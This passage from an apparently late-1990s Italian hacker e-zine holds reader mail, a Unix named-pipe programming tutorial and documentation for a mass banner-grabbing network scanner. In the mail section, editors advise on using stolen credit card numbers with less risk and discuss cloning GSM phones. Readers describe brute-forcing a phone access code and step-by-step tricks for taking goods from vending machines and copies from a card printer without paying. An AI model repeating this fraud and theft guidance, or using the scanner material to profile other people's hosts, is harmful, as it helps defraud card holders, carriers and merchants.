di TIN, quello si' lo devi recuperare da qualcuno e collegarti al suo posto.
Per il tracciamento, diciamo che i numeri verdi generalmente dovrebbero
essere gia' controllati, comunque sono rischiosi, invece per i numeri
"normali" come quelli di un provider e' chiaro che non traccino di default
MA se fai qualche troiata con l'abbonamento puo' darsi che le autorita'
competenti facciano richiesta a Mamma Puttana Telecom x sapere chi caz
chiamava alla tal ora sul tal numero.
Ma aldila' di questo c'e' da dire che molti provider controllano le doppie
connessioni e NON permetteno di entrare contemporaneamente con lo stesso
abbonamento, ma questo varia da provider a provider (chiaramente il provider
piccolo con 1 POP controllera' a manetta, al contrario il grande provider
nazionale + difficilmente controllera' tutto)]

 - Vi risulta che sia un server il
numero 1678-009XX, o e' solo un fax? - E che segnale strano e' quello del
numero 1678-703XX? - Un giorno ho selezionato il numero verde 167-000000,
e ho ricevuto come risposta: "Per favore selezionare il codice di
abilitazione personale" (che ho scoperto essere di 4 cifre) Che cavolo
significa? Mi devo fare tutte le combinazioni da 0000 a 9999 per scoprire
un codice che magari non servira' a niente? Conoscete questo numero verde,
e' di qualche servizio inutile o puo' darsi che abbia beccato qualcosa? -

[Ne ho gia' sentito parlare, si mormora help desk telecom oppure alcuni
lo considerano come una specie di "Numero Verde Globale" (la manna dal cielo
praticamente =)) che permette dopo aver inserito il numero di chiamare un
altro numero aggratis; altro non so (non e' proprio il mio campo), comunque
fossi in te farei attenzione a provare i 10000 codici.... =))]

Inoltre al numero 1678-00000 mi dice: "La chiamata proviene da un'area non
abilitata", che significa? -

[Che la chiamata proviene da un'area non abilitata =))]

Un'ultima cosa, per chiarire una volta per
tutte i termini di hackeraggio etc. specie per i newbie (come me!), vorrei
che pubblicaste una specie di 'glossario' dei termini con la loro
traduzione, anche ad esempio i termini e i comandi in IRC (i vari ban,
firewalls, ecc.) appunto non perche' non sappia cosa siano, ma poi quando
uno si trova a parlare di queste cose e non e' sicuro al 100% di cio' che
dice e' peggio!

[Mmm ancora con questa richiesta di glossari... sai non vorremo finire a fare
dei glossari come quelli del gLande EDU =))
Piuttosto scarica e leggi il Jargon File:
http://p.ulh.as/jargon/jargon400.txt.gz ]

 - All'ospedale della mia citte' c'e' una specie di 286
collegato con il computer centrale, e gli studenti o alcuni utenti possono
andare li' e infilando una tesserina modello videonoleggio si collegano e
possono richiedere tante cosine interessanti (cartelle
cliniche/universitarie, ecc.). la tessera va inserita dopo il collegamento,
e premendo [ESC] per attivarlo si sentono i soliti rumorini del modem/server,
e appaiono le seguenti schermate: ACP: RETE ITAPAC NODO:
0752_00033 (la volta successiva era: 0750_05242)

*PROF 0
*27500239D1421
Sapreste decifrarle? Forse la prima riga si riferisce ad un numero
telefonico, ma la donnina della TELECOM mi dice che e' inesistente!

[Direi che e' un nodo itapac, cui si accede col numero 1422, io non so
praticamente nulla su ITAPAC, cque se cerchi qche faq sulla telefonia
troverai maggiori info...]

P.S.: Se su un sito ci si mettono crack, serials e programmini non
propriamente shareware, ti possono dire qualcosa? (Es. gente tipo Men in
Black che alle 9 di mattina ti viene a prendere a casa perche' ti ha
tracciato, oppure magari ti levano il sito e stop? Chiaramente le
informazioni del modulo di iscrizione sono completamente false.)

[Tolgono il sito e basta..]

[8] "Reqs varie" da Menta

1-Che fine hanno fatto le tecniche di  carding iniziate in BFi 1?

(Risponde \sPIRIT\)
[Diciamo che gli articoli sul carding si possono considerare conclusi
(almeno fino a nuove informazioni). E' stato spiegato il necessario per
praticare carding base limitando i rischi, e l'unico argomento rimasto per
cosi' dire aperto e' la provocazione di Vide0Fuzzy in BFi2. Dubito che si
avra' mai risposta, in quanto il suddetto socio e' sparito dalla
circolazione e non e' piu' in contatto con noi. L'unica cosa che potrebbe
dare un seguito all'argomento e' raccogliere storie vissute dai lettori
cosi' temerari da mettere in pratica i consigli. Un ultimo appunto da fare
riguarda gli utilizzi dei famosi numerini: col senno di poi la
raccomandazione e': DA UTILIZZARE ESCLUSIVAMENTE (e solo SE PROPRIO VOLETE
FARLO) per acquistare servizi in rete, come shell, spazio web, eccetera
eccetera. Da fonti sicure vengono allarmanti notizie sul controllo
euristico delle tipologie di acquisto via CC... vedro' di informarmi
meglio in proposito.]

2 Domande per |PazzO|:

2) il programmino asim funziona anche con Nokia 6110?
Prima di bruciarlo mi piacerebbe saperlo...

(Risponde |Pazzo| ovvio =))
[Certo che funziona, ma stai attento quando costruisci l'interfaccia, trova gli
schemi giusti e collegalo bene o rischi di svuotare l'eprom del celly]

3)Ho preso in prestito i PUK,PIN,IMEI e SN di un troiaio di cellulari GSM
della mia ex ditta,si potrebbero usare a "modino"

[Se non hai i chip a portata di mano non potrai mai clonarli. Ti
potrebbero tornare utili quando, una volta clonati, dovrai reimpostare il
pin1-2 reimpostando il cellulare per effettuare ogni genere di chiamata
(ammesso che la tua ditta abbia limitato il numero di numeri da poter
chiamare).]

[9] "Kualche proposta" by SCIAMAN

Un saluto generale a tutta la redazione del s0ftpr0ject,

[Ciaaaaaaaao]

sono un newbie di 17 anni ed ho deciso di scrivere questa e-mail per
congratularmi con voi per lo splendido lavoro di BuTcHeReD fRoM iNsIdE.

[Graaaaaaaazie]

Purtroppo solo poki giorni fa ho saputo della sua esistenza e tra l'altro
attraverso il mirror del sito di MrZero (grande MrZero!!!!!!), nonstante
tutto pero' ho letto tutti i numeri in due giorni e mi sono divertito un
sakko (grandi le frasi di guerra di PhoenYx e soprattutto i vari galeoni,
trombe, torroni e bombe a mano).

[I siti officials li trovi in coda alla e-zine (sperem..)]

Ma prima di tutto vorrei fare una
proposta: perche' non vi organizzate e pubblicate nei prossimi numeri un
"manifesto" del movimento underground italiano??????

[E che manifestiamo?? boh x me basta la traduzione di Mentor...]

[9] "cellulari..." by Morgan

Cari amici di BFi, (con questo inizio, visto il vostro stile e' gia'
difficile che andiate oltre ma ogni tanto fa anche piacere non essere
chiamati fottuti stronzi) sono una persona con discrete conoscenze di
elettronica e poco piu' che elementari di informatica quindi pur avendo
fatto 2 esami di programmazione, fatico a leggere gli articoli piu'
tecnici.

[Della serie come volevasi dimostrare nelle nostre universita' si fa poco
un cazzo di utile...]

Ho letto con molto interesse in un paio di giorni i primi 4

[Ingordo!! =)]

numeri della rivista: mi e' sembrata molto interessante e originale (nel
senso che gli articoli sembrano farina delle vostre saccocce): bravi 7+,

[Beh si' la maggior parte e' farina dei ns culi =))]

chissa' quanto resistera'.

[Ue' porti sfiga ??]

Alcune considerazioni sempre che ve ne fotta:
-L'odiata mamma puttana telecom (come voi la chiamate) sembra essere
piuttosto in forma dal momento che nonostante i numerosi tentativi per
fotterla sono sempre pu' i fottuti che i fottenti (e non a caso negli
articoli su telecom che fate c'e' molta teoria e poca "pratica"). Fatti 4
conti i famigerati phreaking dovrebbero essere un gruppo di smantettoni
piuttosto agguerriti ma molto frustrati.

[Diciamo che come al solito se qualcuno sa non parla, ricordo qualche tempo
fa (si parla di pochi mesi, quindi gia' si parlava di rete intelligente,
incopiabilita' delle carte etc..) a Napoli furono beccati dei tipi che
non so come ricaricavano le carte telefoniche e le rivendevano di nuovo ai
giornalai. Ora non so quanto fosse vero questo, visto poi quanto sono
'chiari e corretti' i giornali e la tv, comunque se c'era un modo noi certo
non siamo venuti a saperlo, perche' in Italia vale questa legge :
So fare qualcosa per scroccare = ci guadagno sopra e non dico un cazzo in
giro; Mi pare chiaro no?]

-Mentre siete sempre molto attenti negli articoli sull' hacking a mettere
in guardia la gente su quello che puo' rischiare mettendo in pratica le
vostre dritte, non fate
altrettanto quando si parla di telefoni clonati, in fondo con i controlli
sulle celle potrebbe esserci anche una procedura automatica di rilevazione
di due apparecchi identici, oltre al controllo diretto sui numeri chiamati
e quindi sarebbe relativamente semplice e veloce (qualche ms) beccare il
gsm clonato soprattutto se uno e' attivo a Milano e l'altro a Turbigo.

[Questo e' vero sono d'accordo, ragazzuoli state sempre attenti a smanettare
coi giocattoli di Telecom, Tin, Omnitel, Wind, Infostrada, Albacom, Tiscali..
(per una volta ho voluto essere un po' piu' globale =)]

Qualcuno di voi ha  realmente clonato un gsm ? (pazzo, a proposito *#06#
funziona su ogni gsm) Se si, quante chiamate ha fatto? E' possibile che
fino a che si non esageri vada "sempre" bene? Il gioco vale la candela?

[Mai fatto non ci tengo, rigiro la domanda ai lettori...]

Proposte: Sto mettendo a punto dei trasmettitori che consentano a due HP48
di trasmettersi dati via etere a un centinaio di m di distanza (se non lo
sapete chiedete ad un ing. che cosa sono le HP48 ).

[Sappiamo sappiamo... =)]

La cosa potrebbe funzionare anche per 2 computer: usando un programma tipo
kermit e magari

[Kermit e' quello dei Muppets?? scusate non c'entra...=)]

2 ampli e antenne adeguate (il tutto di dimensioni piuttosto modeste) si
potrebbe arrivare a qualche Km: puo' interessare?
Ciao cap99morgan@yahoo.it

[Beh l'idea puo' essere interessante, facci sapere se elabori qualcosa
dichiarabile come Real (e non troppo Complex =))
Ho lasciato la mail non essendo quella 'di casa', se qualcuno lo vuole
contattare faccia pure e poi fatece sape' i risultati]

[10] "Ciao..." da OldDrake

Ciao chiunque voi siate........vi scrivo per avere e darvi informazioni
(spero utili). Iniziamo subito e ricordate che da ora in poi saro' piu'
conciso di uno stru_zo.
2.ho sentito su IRC che si puo' bucare un sistema con una semplice DCC send
e/o chat...come fare? 

[Mmm non ne ho idea e poi la frase e' troppo generica...non si capisce
come e cosa si possa bucare]

3.ho scoperto un bug-temporaneo dei distributori automatici di caffe'
della Nescafe': introducendo una moneta da L.100 (sono quelle piu' leggere
delle 100 normali, ma piu' grandi di quelle piccolissime...non so se sono
stato chiaro) ti da un credito di L. 500 = una consumazione gratis.

4.esiste una pagina web dei Neurozone2 ? Se si', ditemela.

5.Bug distributori automatici di patatine/briosche ( non so se e' presenti in
tutti,ma quello della mia scuola si'): bisogna spingere la lastra di
metallo per prendere normalmente la merendina, ora si tira verso di noi la
lastra di fianco a questa e si apre. Cosi' abbiamo ora i pulsanti appositi
con cui ritirare gratis tutto cio' contenuto nella macchinetta. Update: ora
hanno corretto il bug...ma infilando la mano dentro una fessura in basso,
con il pollice si puo' azionare solo l'ultima levetta e ritirare la
merendina dell' ultima striscia. (bh...per fare cio' bisogna avere della
dita sottili e molto lungo...proprio come le mie :)

6.Bug-stampate tramite tessera (non ricordo che versione fosse la stampante
perche' ora l'hanno cambiata con un modello nuovo): inserire la tessera.
Schiacciare il pulsante stampa.
Ora prima che la banda della tessera venga letta, pigiare il bottone apposito
per estrarre la tessera oppure farlo manualmente. Bene la fotocopia e' stata
fatta, ma non e' scalato nessun credito sulla tessera.

[Senza sapere marca e modello e' un po' inutile comunque provate..]

[10] "schede telefoniche" by THC

Hi!
Vi scrivo a proposito dell'articolo apparso su BFi numero 3 a proposito
del fatto che le schede siano scalate dal telefono o da un server in rete.
A mio parere valgono tutte due le cose. Mi spiego> Un mio amico ha trovato
per terra una scheda telefonica della collezione Panini, con su un
giocatore del Milan (non mi ricordo chi cazzo era) e subito ha provato ad
usarla - 0 lire, ma l'ha conservata. Un girno, cazzeggiando all'ospedale,
ci cade l'occhio su una cabina veeeccchia! To, proviamo a infilare la
scheda: 3200 Lire !!!!!!!!!! il che vuol dire > o e` magia, o le onde
elettromagnetiche nell'etere sono talmente tante che tenere una scheda in
tasca per un po' di mesi la ricarica, o esistono cabine che scalano
l'importo dalla scheda e altre che comunicano con un database contenete
gli importi di tutte le schede nuove. See ya all!!!!!! 

[Grazie della segnalazione, speriamo renda un po' piu' chiara la faccenda]
*************************************

Ragazzi abbiamo pensato di fare un gradito regalo a voi e a noi stessi;
vi sarete rotti le palle di non sapere mai quando esce BFi vero? Figuratevi
me a rispondere alle mail che mandate per sapere la page dove scaricare i
numeri o per sapere la data di uscita della nuova release. =))
Ho creato una mailing list apposta per questo, attenzione:
la BFi Info Mailing List NON E' PER RICHIESTE DI INFORMAZIONI DA PARTE
VOSTRA, per quello c'e' sempre la posta normale, la Mailing List serve per
comunicarvi la pubblicazione di un nuovo numero, l'uscita della nuova
versione di uno dei nostri tools o per comunicarvi eventuali variazioni di
sito, e-mail o simili.
I messaggi possono essere postati sulla mailing-list solo da me, quindi non
potete fare richieste.
PS: Non sono cosi' coglione, so che si possono forgiare i messaggi in modo
che sembrino arrivare da me, ma se arrivano cosi' mi incazzo e non pensiate
che risponda a una richiesta di info in cotal guisa =)
Occhio a quello che arriva, non e' detto che sia official da me quindi
evitero' di postare filez in attachment (potrebbe farlo qualcuno al mio
posto, mandando virii), quindi se arrivano non sono miei =))
Non mandero' BFi in mail in questo modo, primo perche' non c'ho voglia,
secondo perche' non so se la ML accetta file cosi' grossi, terzo perche' qui
avrete solo le info sull'uscita, poi ve la scaricate voi.

Per iscrivervi alla suddetta ML dovete mandare una mail a:
bfi-subscribe@egroups.com

Nota: questo servizio e' sperimentale, non vi assicuro nulla sul suo buon
funzionamento, speriamo vada decentemente e assolva alla sua funzione (cosi'
mi levo un po' di messaggi inutili..).

Ed ora alcune note per le mail che mandate:

1) Evitate se possibile le lettere accentate, al loro posto usate <e'> <a'>
   e affini (cazz poi ci tocca correggerle...)
2) MA PORCA PUTT... Evitate di mandare mail grosse che poi si muore a
   scaricarle!!! Faccio pagare a VOI la telefonata =))
3) Non demordete, la risposta puo' arrivare dopo 2 giorni o dopo 2 mesi...
4) Se non siete soddisfatti della risposta, PAGATEMI e rispondero' meglio =)
5) Se avete idee di qualsiasi tipo, dall' "articolo sull'hacking delle piante
   d'appartamento" al "come ti costruisco il bar dei veri Hackerz" mandate
   pure, le mie super-intelligenti Filtering Rules del Pegasus Mail (ovvio
   che uno con nick Cavallo usi il Pegasus come mail-client no? =))
   provvederanno a rigirarle direttamente nel Cestino del mio computer =))

Eheh cazzate a parte ci si vede per il prossimo numero, che penso sara'
Pasquale (questo lo dico io e NON ne prendo responsabilita' =))

Post Scrotum: EDU sei il mio IDOLO =D

In Sintesi Proteica, per le vostre e-mail:
bfi98@usa.net              per richieste di infoz varie
cavallo@cryogen.com        per le mailz personali
bfi-subscribe@egroups.com  per accedere alla ML

Ciao a tutti
Il Cavallo Alato



==============================================================================
----------------------------------[ HACKiNG ]---------------------------------
==============================================================================


----------------[ PR0GRAMMAZi0NE UNiX: GESTi0NE DEi PR0CESSi ]----------------
-------------------[ PARTE III : NAMED PiPE & UNAMED PiPE ]-------------------
----------------------------------[ pIGpEN ]----------------------------------

Una named pipe non e' altro che un file creato di default con permesso 0666,
il cui scopo e' quello di permettere il trasferimento di dati tra processi
tra loro non collegati da un rapporto padre/figlio tipico del forking.
In genere e' piu' facile sentir parlare di questa bestiolina con il nome fifo
(First In First Out). Come tutte le pipe, il suo scopo sara' quello di
trasferire l'output di uno o piu' processi nell'input di un altro.

NB: Le named pipe sono tipiche di unix e hanno trovato pure implementazione
ad esempio nel SMB per permette lo scambio di chiamate API e in winzozz.
Un esempio del loro uso su unix lo potete vedere per esempio in syslog.conf
se per esempio avete il diald o dei log particolari...

Dal punto di vista della programmazione, quando eravamo in presenza di una
fork() era possibile che i due processi dialogassero tra di loro attraverso
una unamed pipe.
Questa poteva essere ottenuta in vari modi:

- creare un array di interi [con 2 elementi] e usare la funzione pipe()
  A questo punto il primo elemento viene utilizzato per la lettura ed il
  secondo per la scrittura (fatta attraverso le funzioni read() e write() )

// Andatevi a vedere l'introduzone all' IPC 4.4 BSD (facile da trovare)

#include <stdio.h>

#define DATA "Bright star, would I were steadfast as thou art . . ."

/*
 * This program creates a pipe, then forks.  The child communicates to the
 * parent over the pipe. Notice that a pipe is a one-way communications
 * device.  I can write to the output socket (sockets[1], the second socket
 * of the array returned by pipe()) and read from the input socket
 * (sockets[0]), but not vice versa.
 */

main()
{
     int sockets[2], child;

     /* Create a pipe */
     if (pipe(sockets) < 0) {
          perror("opening stream socket pair");
          exit(10);
     }

     if ((child = fork()) == -1)
          perror("fork");
     else if (child) {
          char buf[1024];

          /* This is still the parent.  It reads the child's message. */
          close(sockets[1]);
          if (read(sockets[0], buf, 1024) < 0)
               perror("reading message");
          printf("-->%s\n", buf);
          close(sockets[0]);
     } else {
          /* This is the child.  It writes a message to its parent. */
          close(sockets[0]);
          if (write(sockets[1], DATA, sizeof(DATA)) < 0)
               perror("writing message");
          close(sockets[1]);
     }
}

- fare la stessa cosa solo utilizzando la generica funzione socketpair()
  per connettere i due processi

- usare la funzione popen() che restituisce una stream e la pclose() per
  chiudere la pipe

Anche con le named pipe esistono due funzioni (che fanno praticamente la stessa
cosa, ma non sempre le trovate entrambe implementate).. sisi' ne esisterebbe
una terza, ma non vado a complicare la vita.

- l'immancabile mknod()

/* set the umask explicitly, you don't know where it's been */
umask(0);

if (mknod("test_fifo",
            S_IFIFO | S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP,
           0))
{
    perror("mknod");
    exit(1);
}

- oppure la mkfifo()

/* set the umask explicitly, you don't know where it's been */
umask(0);
if (mkfifo("test_fifo", S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP))
{
    perror("mkfifo");
    exit(1);
}

L'apertura della named pipe avverra' attraverso la open() che sara' bloccata
fino a quando un processo aprira' la pipe in scrittura (salvo che oltre
all'O_RDONLY sia specificata anche la flag O_NONBLOCK).
Cio' vale anche quando aprite la pipe in scrittura e non specificate
l'O_NONBLOCK.
Dopo l'apertura basta utilizzare la read() o la write() a seconda di cosa
dovete fare.

- la read() restituira' EOF quando tutti i processi che scrivevano sulla pipe
  l'avranno lasciata.

- la write() restituira' SIGPIPE quando tutti i processi che leggevano sulla
  pipe avranno chiuso la pipe.

ok, bauz
pIGpEN


--------------------------[ ACES HiGH SCANNER v2.7 ]--------------------------
----------------------------------[ pIGpEN ]----------------------------------

1.0 Introduzione

- Storia
- Cos'e' Aces High
- Differenza tra outlist e aces.log
- Ringraziamenti
- Dedica

1.1 Funzioni

- Semplice TCP Scanner
- Funzione di comparazione di stringa

1.2 Telnet Scanner

- TCP Scan (per trovare host con porta 23 aperta)
- Scanner per cercare particolari caratteri (es. versioni di S.O.)
  sull'issue di una lista di host

1.3 RPC Scanner

- Scanning di tutti i servizi RPC
- Scanning di caratteri contenuti nei servizi RPC

1.4 FINGER Scanner

- TCP Scan (per cercare le porte finger aperte)
- USER Scan (Scanning per cercare utenti)
- GREP Scan (Scanning a comparazione di stringa per utenti online)

1.5 NFS Scanner

- Scan per visualizzare tutte le directory mountabili
- Scan per ricercare stringhe (directory/condivisioni ecc...)

1.6 SAMBA Scanner

- TCP Scan (per cercare host con NETBIOS)
- Scan per visualizzare tutte le informazioni sulle directory condivise
- Scan a comparazione di stringa per cercare particolari caratteri
  (nome dir/condivisioni/versione Samba)

1.7 WEB Scanner

- TCP Scan (per cercare host con la porta 80 aperta)
- Scan per cercare l'esistenza di un file negli hosts
- Scan per cercare una stringa all'interno di un file web su una lista
  di host

1.8 Altre novita'

- Altre news
- Altri Tools

1.9 Conclusioni

2.0 Versione 2.7


1.0 Introduzione
    ------------

- Storia

  Tutto comincio' ascoltando un vecchio LP degli Iron Maiden, sisi ok parlo di
  Powerslave, mentre in pieno trip di caffeina (l'unica mia droga dopo il
  computer), scrissi la prima versione il cui numero mi ricorda tanto il
  vecchio  Workbench dell'Amiga :), beh fui spinto ad andare avanti e ora dopo
  aver fatto vedere la versione 1.9 ad un mio amico australiano, mi e' stato
  chiesto se potessi permettere di pubblicarlo su una zine straniera.
  Visto che la scena italiana veniva e forse viene ancora giudicata da schifo
  (da parte degli italiani) ho pensato di pubblicarlo su BFi. Prima cosa
  perche' BFi secondo me fa la differenza, seconda cosa perche' sono italiano
  :)
  Non mi interessa come venga giudicato questo tool, prendetelo come volete...
  l'importante e' fare qualcosa per cercar di cambiare...

- Cos'e' Aces High

 L'Aces High puo' essere considerato una specie di grep... beh si' quasi, a
 parte il fatto che viene fatto su particolari servizi di una valanga di ip.
 Questo "scanner" oltre a ricercare stringhe o un carattere su generiche porte
 (sempre in tcp rulez ;) e' in grado di fare altrettanto sulla porta telnet e
 di estrarre servizi o stringhe via rpc, nfs, finger, web...
 In effetti e' un tool brain oriented, la sua versatilita' sara' scoperta solo
 se ricompensata con i vostri impulsi celebrali...
 Invito tutti quanti ad una buona masturbazione celebrale prima di fare
 qualkosa che non sapete bene cosa sia.
 In questo breve doc NON spieghero' tutti i modi d'uso (lascio a voi un sacco
 di idee che sono sicuro accenderanno un lumino nel vostro cervello o faranno
 scattare qualche interrupt di autodistruzione).
 Del source code potete farci quello che volete basta che lasciate i credits,
 chiedo scusa se alcune parti possono non essere immediatamente chiare (vedi
 funzione exp.c o identificazione del servizio nel main), ma dico subito che
 odio un certo tipo di programmazione... o meglio mi piace vederla fatta dagli
 altri..... :)
 Qualcuno ha detto che questo e' lo Scanner (si dice il? boh 8): non lo e'
 ancora, manca il modulo dell'udp che per ora non pubblico perche' ho un
 piccolo problema filosofico... e altre cosette che per ora non vi dico cosa
 sono :)

- Differenza tra outlist e aces.log

 Con questa nuova versione dell'aces high esistono due tipi di file generati.
 La outlist contiene una semplice lista di dove la stringa/servizio e' stata
 individuata e l'aces.log oltre a informazioni relative al tipo di scan
 e a quando questo e' stato avviato/killato/finito contiene pure il buffer di
 OGNI IP dove il carattere/stringa e' stato trovato.
 Quindi nel caso che stiate cercando una versione del sendmail vi verra'
 fuori la stringa di presentazione del sendmail, nel caso della porta telnet
 l'intero issue, nel caso del servizio web l'intera pagina htm (state
 tranquilli niente gif e cagate varie :) ecc.....

- Ringraziamenti

 Ringrazio prima di tutto Skav e l' A.D.A per l'attenzione.
 David Gans (che immagino non lo verra' mai a sapere) per una chiacchierata
 fatta tempo fa sui Dead :) La WELL e' sempre la WELL :) E per i numerosi
 libri SUPER su cio' che non ho mai vissuto.
 Un mega saluto a Bit Bunny, per essersi fatto vivo dopo tanto tempo (forse
 era colpa mia ;) ooppss immagino che di italiano non ne capisca un cazzo
 (nemmeno io =)
 Un pacco di saluti pure ad una persona che non ha nick e immagino che non
 voglia vedere il suo nome in una guida come questa.... per darmi un po' di
 voglia di andare in quella merdosa universita'... ne ho di anni da starci...
 Chiedo scusa poi a tutti quelli a cui non ho risposto via mail, ma sono full
 fino al piggy...
 Naturalmente l'ultimo saluto (quello piu' importante) va ai ragazzi di BFi
 perche' "They think different" :)

- Dedica

 Dedicato ad una ragazza il cui nome si trova sull'host 192.168.1.2 della mia
 rete di casa... TI AMO :* Anche se non ci vediamo piu'.
 E dedicato pure a tutti coloro che non si vantano per quello che sanno.. poco
 o tanto che sia, e' sempre poco.
 Un'ultima dedica va ai miei amici... se dovessi fare una rete delle mie
 amicizie credo che la classe C sarebbe sufficiente.

1.1 Funzioni
    --------

- Semplice TCP Scanner

Lanciando l'aces vi apparira':

                         -----[ ACES HiGH SCANNER ]-----
                               --[ VERSION: 2.7 ]--
                                   -[ pIGpEN ]-
 Usage:

 ./aces inputfile outputfile SERViCE -[no]cmp

 Example: ./aces in out 25 -cmp
           STRING -> Sendmail
           ./aces in out 139 -nocmp
           SERViCE MAY BE: a numeric port, rpc, nfs, smb, finger, web
           ./aces in out nfs -cmp

o qualkosa del genere....

Il caso piu' semplice e' quello di utilizzare questo programma come TCP
Scanner.

La sintassi per questa funzione e':

 aces in out port -nocmp

Dove:

 aces: e' il nome del programma (BAANAAANAAA!!!)
 in: e' una semplice lista di host
     (che siano nomi logici o nel formato decimale puntato non fa differenza)
 out: e' una semplice list di output
     (nello stesso formato dell'in solo che qui ci saranno solo gli host che
      hanno quel determinato servizio 2 BAAANANANNE!!!!)
 port: e' la porta
 -nocmp: serve a dire ad aces che non deve fare una comparazione di stringa

Vediamo un esempio pratico nella mia rete di casa:

[ Il file di esempio rete.pig e': ]

  192.168.1.1
  192.168.1.2
  192.168.1.3

  ./aces rete.pig out.pig 25 -nocmp
[I colori qui non li vedete 3 BAAAAANAAANEEE!!!!!!]

ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

  192.168.1.1: Service FOUND!
  192.168.1.2: Service FOUND!
  192.168.1.3: Connection refused()

Okok voi potete dire:
"Ehi pig questo lo abbiamo gia' capito dalla versione 1.3"

La novita' e' un file di log che contiene in append gli scan in modo
dettagliato:

[aces.log]

ACES HIGH STARTED --> Mon Feb 15 18:40:15

===========================================
|   ACES HiGH SCANNER RUN IN NORMAL MODE  |
===========================================

[PORT/SERViCE] ====> 25
[STRING]       ====> N0NE
[SiMpLE FiLE]  ====> out.pig

Service FOUND at 192.168.1.1
Service FOUND at 192.168.1.2

ACES HIGH END --> Mon Feb 15 18:40:15

- Funzione di comparazione di stringa

La cosa si fara' molto piu' interessante nel caso dell'opzione -cmp .
Vediamo per esempio cosa succede con il seguente comando:

./aces rete.pig outz 143 -cmp
ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

STRING -> IMAP4

I will scan for "IMAP4" string

192.168.1.1: Connection refused.
192.168.1.2: Service FOUND! String Check -> String FOUND! * OK xxxx.cameretta.pig IMAP4rev1 v10.190 server ready

192.168.1.3: Connection refused.

[aces.log]

ACES HIGH STARTED --> Fri Feb 19 12:01:36

============================================
| ACES HiGH SCANNER RUN IN CMP MODE STRING |
============================================

[PORT/SERViCE] ====> 143
[STRING]       ====> IMAP4
[SiMpLE FiLE]  ====> outz

Service FOUND at 192.168.1.2
String FOUND! * OK xxxx.cameretta.pig IMAP4rev1 v10.190 server ready

ACES HIGH END --> Fri Feb 19 12:02:23

1.2 Telnet Scanner
    --------------

- TCP Scan (per trovare host con porta 23 aperta)

Questa funzione come avrete gia' capito e' ottenibile con il seguente comando:

./aces infile outfile 23 -nocmp

- Scanner per cercare particolari caratteri (es. versioni di S.O.)
  sull'issue di una lista di host:

 ./aces rete.pig out.pig 23 -cmp

ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

STRING -> GOV
I will scan for " GOV " string

192.168.1.1: Service FOUND! String Check -> String Not Found
192.168.1.2: Service FOUND! String Check -> String FOUND!
                    COMPUTER  SECURITY  WARNING  NOTICE
 WARNING                          WARNING                              WARNING
 *****************************************************************************
 THIS COMPUTER IS OPERATED BY/FOR THE PIG GOVERNMENT.  UNAUTHORIZED ACCESS TO
 AND/OR USE OF THIS COMPUTER SYSTEM IS A VIOLATION OF LAW AND PUNISHABLE UNDER
                   THE PROVISIONS OF UNDERGR0UND STATUTES.
 *****************************************************************************
 WARNING                          WARNING                              WARNING
 =============================================================================
 Security Reminder: DO NOT LEAVE A TERMINAL LOGGED INTO A COMPUTER UNATTENDED!
 =============================================================================

192.168.1.3: Connection refused()

Okok andiamo a vedere l'aces.log in append a quello che c'era prima troverete:

ACES HIGH STARTED --> Mon Feb 15 18:46:30

============================================
| ACES HiGH SCANNER RUN IN CMP MODE STRING |
============================================

[PORT/SERViCE] ====> 23
[STRING]       ====> GOV
[SiMpLE FiLE]  ====> out.pig

Service FOUND at 192.168.1.1
Service FOUND at 192.168.1.2
String FOUND!
                   COMPUTER  SECURITY  WARNING  NOTICE
 WARNING                          WARNING                              WARNING
 *****************************************************************************
 THIS COMPUTER IS OPERATED BY/FOR THE PIG GOVERNMENT.  UNAUTHORIZED ACCESS TO
 AND/OR USE OF THIS COMPUTER SYSTEM IS A VIOLATION OF LAW AND PUNISHABLE UNDER
                   THE PROVISIONS OF UNDERGR0UND STATUTES.
 *****************************************************************************
 WARNING                          WARNING                              WARNING
 =============================================================================
 Security Reminder: DO NOT LEAVE A TERMINAL LOGGED INTO A COMPUTER UNATTENDED!
 =============================================================================

ACES HIGH END --> Mon Feb 15 18:46:34

Prima che qualcuno si chieda la provenienza dell'issue si vada a vedere i
bollettini (cristo sembro un giornalista) della Swedish Hackers Association...

1.3 RPC Scanner
    -----------

- Scanning di tutti i servizi rpc

  ./aces infile outfile rpc -nocmp

  Il -nocmp applicato agli rpc equivarra' ad un rpcinfo -p nomehost
  per tutti gli ip della scan list :)

./aces rete.pig out rpc -nocmp

ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

RPC Information FOUND! at 192.168.1.2 --> rpcbind
RPC Information FOUND! at 192.168.1.2 --> rpcbind
RPC Information FOUND! at 192.168.1.2 --> mountd
RPC Information FOUND! at 192.168.1.2 --> mountd
RPC Information FOUND! at 192.168.1.2 --> mountd
RPC Information FOUND! at 192.168.1.2 --> mountd
RPC Information FOUND! at 192.168.1.2 --> nfs
RPC Information FOUND! at 192.168.1.2 --> nfs

E l'aces.log sara':

ACES HIGH STARTED --> Mon Feb 15 18:54:56

============================================
|    ACES HiGH SCANNER RUN IN NORMAL MODE  |
============================================

[PORT/SERViCE] ====> rpc
[STRING]       ====> N0NE
[SiMpLE FiLE]  ====> out

RPC INFORMATiON FOUND! at 192.168.1.2 --> rpcbind
RPC INFORMATiON FOUND! at 192.168.1.2 --> rpcbind
RPC INFORMATiON FOUND! at 192.168.1.2 --> mountd
RPC INFORMATiON FOUND! at 192.168.1.2 --> mountd
RPC INFORMATiON FOUND! at 192.168.1.2 --> mountd
RPC INFORMATiON FOUND! at 192.168.1.2 --> mountd
RPC INFORMATiON FOUND! at 192.168.1.2 --> nfs
RPC INFORMATiON FOUND! at 192.168.1.2 --> nfs

ACES HIGH END --> Mon Feb 15 18:55:17

- Scanning di caratteri contenuti nei servizi RPC

./aces rete.pig out rpc -cmp
ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

STRING -> rpc
I will scan for " rpc " string

RPC Information FOUND! at 192.168.1.2 --> rpcbind
RPC Information FOUND! at 192.168.1.2 --> rpcbind

Con questo comando ho cercato semplicemente la presenza dei caratteri rpc in
TUTTI i nomi!!!!

L'aces.log riportera':

ACES HIGH STARTED --> Mon Feb 15 18:58:43

============================================
| ACES HiGH SCANNER RUN IN CMP MODE STRING |
============================================

[PORT/SERViCE] ====> rpc
[STRING]       ====> rpc
[SiMpLE FiLE]  ====> out

RPC INFORMATiON FOUND! at 192.168.1.2 --> rpcbind
